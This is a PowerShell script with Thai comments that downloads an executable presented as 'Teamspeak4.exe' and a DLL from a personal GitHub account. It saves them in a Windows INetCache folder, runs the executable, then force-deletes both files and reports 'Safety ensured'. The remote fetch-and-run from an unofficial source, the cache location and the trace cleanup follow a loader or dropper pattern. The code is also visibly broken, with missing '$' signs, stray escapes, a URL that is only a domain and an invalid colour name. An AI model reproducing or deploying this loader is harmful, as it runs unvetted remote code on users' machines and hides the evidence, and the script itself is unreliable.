# ====================================================================
# สคริปต์ดาวน์โหลด รัน และลบไฟล์อัตโนมัติหลังปิดโปรแกรม
# ====================================================================

# บังคับให้แสดงผลภาษาไทย/อังกฤษในคอนโซลได้อย่างถูกต้อง
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# 1. ตั้งค่าตัวแปรและพาธสำหรับเก็บไฟล์ในระบบ (โฟลเดอร์ Cache ของระบบ)
cacheDir = "env:LOCALAPPDATA\Microsoft\INetCache\cache"
exePath = "cacheDir\Teamspeak4.exe"
dllPath = "cacheDir\TS3.dll"

# ลิงก์สำหรับดาวน์โหลดไฟล์ดิบ (Raw URL) จาก GitHub ของคุณ
\$exeUrl   = "https://raw.githubusercontent.com/kanokpoltankaew712-gif/Teamspeak4cvrftg/main/Teamspeak4.exe"
\$dllUrl   = "https://githubusercontent.com"

# ตรวจสอบว่ามีโฟลเดอร์ปลายทางหรือไม่ ถ้าไม่มีให้สร้างขึ้นมา
if (-not (Test-Path \$cacheDir)) {
    New-Item -ItemType Directory -Path \$cacheDir -Force | Out-Null
}

# 2. เริ่มกระบวนการดาวน์โหลดไฟล์ลงเครื่อง
Write-Host "Downloading Teamspeak4.exe ..." -ForegroundColor Cyan
Invoke-WebRequest -Uri exeUrl -OutFile exePath -UseBasicParsing
Write-Host "Downloaded: \$exePath" -ForegroundColor Green

Write-Host "Downloading TS3.dll ..." -ForegroundColor Cyan
Invoke-WebRequest -Uri dllUrl -OutFile dllPath -UseBasicParsing
Write-Host "Downloaded: \$dllPath" -ForegroundColor Green

# 3. สั่งรันโปรแกรม และสั่งให้ PowerShell รอจนกว่ากระบวนการจะปิดตัวลง
Write-Host "`nStarting Teamspeak4..." -ForegroundColor Yellow
Write-Host "Teamspeak4 is running. Wait until you close the program..." -ForegroundColor Green
Write-Host "(Do not close this PowerShell window)" -ForegroundColor Yellow

# รันโปรแกรมและรอจนจบกระบวนการ (โปรแกรมปิด หน้าต่างนี้ถึงจะทำงานต่อ)
Start-Process -FilePath \$exePath -Wait

# 4. กระบวนการทำความสะอาด ลบไฟล์ทิ้งทันทีหลังปิดโปรแกรม
Write-Host "`n[!] Program closed. Starting cleanup process..." -ForegroundColor Maroon

# ลบไฟล์ Teamspeak4.exe
if (Test-Path $exePath) {
    Remove-Item -Path $exePath -Force
    Write-Host "[-] Removed: Teamspeak4.exe" -ForegroundColor Red
}

# ลบไฟล์ TS3.dll
if (Test-Path $dllPath) {
    Remove-Item -Path $dllPath -Force
    Write-Host "[-] Removed: TS3.dll" -ForegroundColor Red
}

Write-Host "`n[✓] Cleanup complete. Safety ensured." -ForegroundColor Green
